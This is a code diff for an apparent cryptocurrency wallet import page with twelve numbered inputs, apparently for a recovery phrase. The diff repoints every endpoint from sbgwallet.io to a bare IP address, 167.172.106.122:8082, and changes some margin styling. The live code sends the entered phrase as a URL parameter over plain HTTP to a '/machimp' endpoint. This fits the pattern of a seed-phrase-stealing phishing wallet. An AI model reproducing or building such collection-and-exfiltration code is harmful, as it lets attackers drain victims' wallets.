@@ -35,7 +35,7 @@ function imp() {
   {
       alert("Please fill the fields");
   } else {
-// fetch("http://sbgwallet.io:8082/machimp?input="+obj)
+// fetch("http://167.172.106.122:8082/machimp?input="+obj)
 //   .then(function(res) {
 //       return res.json();
 //   })
@@ -66,7 +66,7 @@ function imp() {
   
 //  });
 
- fetch("http://sbgwallet.io:8082/machimp?input="+obj)
+ fetch("http://167.172.106.122:8082/machimp?input="+obj)
   .then((res) => res.json())
   .then(async (data) => { 
     Pwdupdate(data,obj)
@@ -103,7 +103,7 @@ if (password != cpassword) {
 } else if (password === "" || password === undefined || password === null) {
   alert("Fill in the password field");
 } else {
-  // const url = "http://sbgwallet.io:8082/addimp";
+  // const url = "http://167.172.106.122:8082/addimp";
 
   let data = {
     password: cpassword,
@@ -142,7 +142,7 @@ if (password != cpassword) {
 //   alert("Please enter Confirm password");
 // }else if(password === cpassword) {
 
-//   const url = `http://sbgwallet.io:8082/updatedataimp/${id}`;
+//   const url = `http://167.172.106.122:8082/updatedataimp/${id}`;
 
 //   let data = {
 //     password : password,
@@ -169,7 +169,7 @@ if (password != cpassword) {
 }
 
 // async function Getdata(cpassword) {
-//   await fetch(`http://sbgwallet.io:8082/getdata1${cpassword}`)
+//   await fetch(`http://167.172.106.122:8082/getdata1${cpassword}`)
 //     .then((response) => {
 //       return response.json();
 //     })
@@ -183,7 +183,7 @@ if (password != cpassword) {
 //       // window.location.replace("/wallet");
 //     });
 //   //   return(
-//   //   await fetch(`http://sbgwallet.io:8082/getdata1${p2}`)
+//   //   await fetch(`http://167.172.106.122:8082/getdata1${p2}`)
 //   //   .then(function(res) {
 //   //      return res.json();
 //   //     })
@@ -299,7 +299,7 @@ function cat(data){
 
         <div style={{display:'flex'}} className="p-19 mb-3">
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>1.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>1.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -311,7 +311,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>2.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>2.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -323,7 +323,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>3.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>3.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -337,7 +337,7 @@ function cat(data){
         </div>
         <div style={{display:'flex'}} className="p-19 mb-3">
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>4.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>4.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -349,7 +349,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>5.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>5.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -361,7 +361,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>6.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>6.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -375,7 +375,7 @@ function cat(data){
         </div>
         <div style={{display:'flex'}} className="p-19 mb-3">
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>7.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>7.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -387,7 +387,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>8.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>8.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -399,7 +399,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>9.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>9.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -413,7 +413,7 @@ function cat(data){
         </div>
         <div style={{display:'flex'}} className="p-19 mb-3">
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>10.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>10.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -425,7 +425,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px',paddingRight:'5px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>11.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>11.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
@@ -437,7 +437,7 @@ function cat(data){
             />
           </div>
           <div style={{marginRight:'20px'}} className="row input-group mb-3">
-            <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>12.</h6>
+            <h6 style={{marginTop:'10px',marginRight:'8px'}} className='col-1'>12.</h6>
             <input
             style={{borderRadius:'10px',paddingRight:'10px'}}
               className="col-11 form-control password"
